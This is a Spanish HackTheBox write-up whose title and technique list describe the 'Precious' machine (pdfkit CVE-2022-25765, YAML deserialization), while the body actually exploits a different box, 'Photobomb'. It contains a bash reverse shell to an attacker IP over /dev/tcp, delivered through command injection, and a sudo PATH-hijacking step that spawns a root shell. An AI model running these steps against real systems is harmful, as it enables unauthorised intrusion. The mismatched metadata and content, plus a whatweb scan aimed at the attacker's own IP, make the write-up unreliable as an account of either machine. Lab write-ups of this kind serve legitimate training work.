---
title: Precious
os: Linux
published: 2026-06-04
tags: [pdfkit, Command Injection, CVE-2022-25765, Information Leakage, User Pivoting, Abusing sudoers, eWPT]
category: HackTheBox
---

## Información Básica

### Técnicas vistas

- Pdfkit v0.8.6 Exploitation - Command Injection (CVE-2022-25765)
- Advanced Python Scripting - Autopwn Script [EXTRA]
- Information Leakage [User Pivoting]
- Abusing sudoers privilege + Yaml Deserialization Attack [Privilege Escalation]

### Preparación

- eWPT

***

## Reconocimiento

### Nmap

Iniciaremos el escaneo de **Nmap** con la siguiente línea de comandos:

```bash
nmap -p- --open -sS --min-rate 5000 -vvv -n -Pn 10.129.228.60 -oG nmap/allPorts 
```

| Parámetro           | Descripción                                                                                  |
| ------------------- | -------------------------------------------------------------------------------------------- |
| `-p-`               | Escanea **todos los puertos** (1-65535).                                                     |
| `--open`            | Muestra **solo puertos abiertos**.                                                           |
| `-sS`               | Escaneo **SYN** (rápido y sigiloso).                                                         |
| `--min-rate 5000`   | Envía al menos **5000 paquetes por segundo** para acelerar el escaneo.                       |
| `-vvv`              | Máxima **verbosidad**, muestra más detalles en tiempo real.                                  |
| `-n`                | Evita resolución DNS.                                                                        |
| `-Pn`               | Asume que el host está activo, **sin hacer ping** previo.                                    |
| `10.129.228.60`      | Dirección IP objetivo.                                                                       |
| `-oG nmap/allPorts` | Guarda la salida en formato **grepable** para procesar con herramientas como `grep` o `awk`. |

```
PORT   STATE SERVICE REASON
22/tcp open  ssh     syn-ack ttl 63
80/tcp open  http    syn-ack ttl 63
```

Ahora con la función **extractPorts**, extraeremos los puertos abiertos y nos los copiaremos al clipboard para hacer un escaneo más profundo:

```bash title="Función de S4vitar"
extractPorts () {
	ports="$(cat $1 | grep -oP '\d{1,5}/open' | awk '{print $1}' FS='/' | xargs | tr ' ' ',')" 
	ip_address="$(cat $1 | grep -oP '\d{1,3}\.\d{1,3}\.\d{1,3}\.\d{1,3}' | sort -u | head -n 1)" 
	echo -e "\n[*] Extracting information...\n" > extractPorts.tmp
	echo -e "\t[*] IP Address: $ip_address" >> extractPorts.tmp
	echo -e "\t[*] Open ports: $ports\n" >> extractPorts.tmp
	echo $ports | tr -d '\n' | xclip -sel clip
	echo -e "[*] Ports copied to clipboard\n" >> extractPorts.tmp
	/bin/batcat --paging=never extractPorts.tmp
	rm extractPorts.tmp
}
```

```
nmap -sVC -p22,80 10.129.228.60 -oN nmap/targeted
```

| Parámetro           | Descripción                                                                          |
| ------------------- | ------------------------------------------------------------------------------------ |
| `-sV`               | Detecta la **versión** de los servicios que están corriendo en los puertos abiertos. |
| `-C`                | Ejecuta **scripts NSE de detección de versiones y configuración**.                   |
| `-p`                | Escanea únicamente los puertos seleccionados.                                        |
| `10.129.228.60`      | Dirección IP objetivo.                                                              |
| `-oN nmap/targeted` | Guarda la salida en **formato normal** en el archivo indicado.                       |

```
PORT   STATE SERVICE VERSION
22/tcp open  ssh     OpenSSH 8.2p1 Ubuntu 4ubuntu0.5 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey: 
|   3072 e2:24:73:bb:fb:df:5c:b5:20:b6:68:76:74:8a:b5:8d (RSA)
|   256 04:e3:ac:6e:18:4e:1b:7e:ff:ac:4f:e3:9d:d2:1b:ae (ECDSA)
|_  256 20:e0:5d:8c:ba:71:f0:8c:3a:18:19:f2:40:11:d2:9e (ED25519)
80/tcp open  http    nginx 1.18.0 (Ubuntu)
|_http-server-header: nginx/1.18.0 (Ubuntu)
|_http-title: Photobomb
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel
```

### Whatweb

Usamos el comando **whatweb** para ver más información:

```bash wrap=false
❯ whatweb http://10.10.15.143
http://10.10.15.143 [200 OK] Country[RESERVED][ZZ], HTTPServer[SimpleHTTP/0.6 Python/3.13.12], IP[10.10.15.143], Python[3.13.12]
```

### Virtual Hosting

Si accedemos a `http://10.10.15.143`, nos redirige a `http://photobomb.htb` por lo que debemos poner ese dominio en el `/etc/hosts`.

![Web Image](1.png)

### Web Enumeration

Revisando las solicitudes de la web en busca de pistas encontramos un script llamado `photobomb.js`:

```javascript title="photobomb.js"
function init() {
  // Jameson: pre-populate creds for tech support as they keep forgetting them and emailing me
  if (document.cookie.match(/^(.*;)?\s*isPhotoBombTechSupport\s*=\s*[^;]+(.*)?$/)) {
    document.getElementsByClassName('creds')[0].setAttribute('href','http://pH0t0:b0Mb!@photobomb.htb/printer');
  }
}
window.onload = init;
```

Encontramos las credenciales `pH0t0:b0Mb!`.

Si accedemos a esa ruta que nos dice, vemos lo siguiente:

![Image Download](2.png)

### Image Download Utility

Vemos una utilidad para descargar imagenes con parametros, vamos a ver que sucede por detras:

```txt
POST /printer HTTP/1.1
Host: photobomb.htb
Content-Length: 101
Cache-Control: max-age=0
Authorization: Basic cEgwdDA6YjBNYiE=
Upgrade-Insecure-Requests: 1
Content-Type: application/x-www-form-urlencoded
User-Agent: Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/148.0.0.0 Safari/537.36
Origin: http://photobomb.htb
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7
Referer: http://photobomb.htb/printer
Accept-Encoding: gzip, deflate, br
Accept-Language: es-ES,es;q=0.9
Connection: keep-alive

photo=voicu-apostol-MWER49YaD-M-unsplash.jpg&filetype=jpg&dimensions=3000x2000
```

## Explotación

### Command Injetcion to RCE

Probando, es vulnerable a *Command Injection* en el parametro `filetype`. Por lo que escalamos a un *Remote Command Execution* mediante una reverse shell simple como esta:

```bash 
#!/bin/bash

sh -i >& /dev/tcp/10.10.15.143/8888 0>&1
```

Y ahora spawneamos una tty interactiva:

```bash
$ which python3
/usr/bin/python3
$ python3 -c 'import pty; pty.spawn("/bin/bash")'
wizard@photobomb:~/photobomb$ 
```

Y simplemente obtenemos la *user flag*: 

```bash
wizard@photobomb:~/photobomb$ pwd
/home/wizard/photobomb
wizard@photobomb:~/photobomb$ cd ../
wizard@photobomb:~$ ls
photobomb  user.txt
wizard@photobomb:~$ cat user.txt 
24baa92561282ee...
```

## Escalada de pivilegios

Para comenzar la escalada, ejecutamos `sudo -l` para ver nuestros privilegios:

```bash
wizard@photobomb:~/photobomb$ sudo -l
Matching Defaults entries for wizard on photobomb:
    env_reset, mail_badpass, secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin\:/snap/bin

User wizard may run the following commands on photobomb:
    (root) SETENV: NOPASSWD: /opt/cleanup.sh
```

Encontramos el siguiente script el cual podemos correr como sudo asignando el `PATH`: 

```bash title="/opt/cleanup.sh"
wizard@photobomb:~/photobomb$ cat /opt/cleanup.sh
#!/bin/bash
. /opt/.bashrc
cd /home/wizard/photobomb

# clean up log files
if [ -s log/photobomb.log ] && ! [ -L log/photobomb.log ]
then
  /bin/cat log/photobomb.log > log/photobomb.log.old
  /usr/bin/truncate -s0 log/photobomb.log
fi

# protect the priceless originals
find source_images -type f -name '*.jpg' -exec chown root:root {} \;
```

### PATH Hijacking

Para vulnerar esto es muy sencillo mediante **PATH Hijacking**, deberemos seguir lo siguentes pasos:

1. Crear un script que sustituya `find`
2. Darle permisos
3. Ejecutar el script con el PATH malicioso donde se encuentra nuestro script

```
wizard@photobomb:~/photobomb$ echo '#!/bin/bash' > /tmp/find
wizard@photobomb:~/photobomb$ echo '/bin/bash -p' >> /tmp/find
wizard@photobomb:~/photobomb$ chmod +x /tmp/find
wizard@photobomb:~/photobomb$ sudo PATH=/tmp:$PATH /opt/cleanup.sh
root@photobomb:/home/wizard/photobomb# whoami
root
root@photobomb:/home/wizard/photobomb# cat /root/root.txt
243c2e583eaca4235...
```


[Pwned!](https://labs.hackthebox.com/achievement/machine/1992274/500)

---